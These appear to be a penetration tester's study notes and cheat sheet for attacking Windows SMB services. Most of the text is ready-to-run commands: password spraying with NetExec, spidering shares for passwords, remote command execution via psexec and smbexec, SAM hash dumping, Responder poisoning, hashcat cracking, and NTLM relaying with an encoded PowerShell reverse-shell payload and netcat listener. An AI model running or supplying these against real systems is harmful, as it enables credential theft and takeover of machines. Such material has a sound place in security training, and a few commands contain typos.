UDP ports `137` and `138`
139 for netbios
445 for smb directly without netbios

### Brute Forcing and Password Spray

Spraying domain joined

```shell-session
$ nxc smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' d <domain>
```

non domain joined with local-auth

```
nxc smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

N**ote:** By default CME will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found.

## Users

get users

```
--users
```

`logged in`

```shell-session
$ nxc smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

`enumerate rdp connections`

```
 nxc --qwinsta             Enumerate RDP connections
```

### Host

enumerate local groups on a target host

```
--local-groups
```

## credential mining

spider for specific patterns

```
nxc --spider <share> --pattern 'pass'
```

```
nxc --spider <share> --pattern '<pattern>' --regex '<regex>'
```

Options for spidering shares

```

 --spider SHARE        share to spider
 --spider-folder FOLDER
                       folder to spider (default: .)
 --content             enable file content searching
 --exclude-dirs DIR_LIST
                       directories to exclude from spidering
 --depth DEPTH         max spider recursion depth
 --only-files          only spider files
 --pattern PATTERN [PATTERN ...]
                       pattern(s) to search for in folders, filenames and file content
 --regex REGEX [REGEX ...]
                       regex(s) to search for in folders, filenames and file content
```

## Files

NXC get file

```
 --get-file FILE <path>  Get a remote file, ex: \\Windows\\Temp\\whoami.txt whoami.txt
```

### spider all share files

The module `spider_plus` will dig through each readable share on the host and list all readable files. Let's give it a try.

```shell
$ sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
/tmp/cme_spider_plus
```

read output json file

## SMBMAP

```shell-session
$ smbmap -u forend -p Klmcargo2 -d blackwood.local -H 172.16.5.5
```

### Recursive list of all directories (no files)

```shell-session
$ smbmap -u forend -p Klmcargo2 -d blackwood.local -H 172.16.5.5 -R 'Department Shares'
```

---

## Remote Commands

```shell-session
 impacket-psexec -h
```

To connect to a remote machine with a local administrator account, using `impacket-psexec`, you can use the following command:

```shell-session
$ impacket-psexec administrator:'Password123!'@10.10.110.17
```

using netexc RCE

```shell-session
$ nxc smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

extract SAM hashes

```shell-session
]$ nxc smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

## Forcing Authentication attacks (poisoning)

by creating a fake SMB Server to capture users' [NetNTLM

```shell-session
$ sudo responder -I ens33
```

crack hash

```shell-session
]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

If we cannot crack the hash, we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py). Let us see an example using `impacket-ntlmrelayx`.

# NTLM RELAYING

First, we need to set SMB to `OFF` in our responder configuration file (`/etc/responder/Responder.conf`).

```shell-session
$ cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

Then we execute `impacket-ntlmrelayx` with the option `--no-http-server`, `-smb2support`, and the target machine with the option `-t`. By default, `impacket-ntlmrelayx` will dump the SAM database, but we can execute commands by adding the option `-c`.

```shell-session
$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, attacking target smb://10.10.110.146
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
```

Setup an instant reverse shell

```shell-session
$ tlcwrap nc -lvnp 9001
```

```shell-session
$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <b64>'
```

# SysInternals psexec

We can download PsExec from [Microsoft website](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec), or we can use some Linux implementations:

- [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - Python PsExec like functionality example using [RemComSvc](https://github.com/kavika13/RemCom).
- [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) - A similar approach to PsExec without using [RemComSvc](https://github.com/kavika13/RemCom). The technique is described [here](https://web.archive.org/web/20190515131124/https://www.optiv.com/blog/owning-computers-without-shell-access). This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
- [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - includes an implementation of `smbexec` and `atexec`.
  - [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Ruby PsExec implementation.
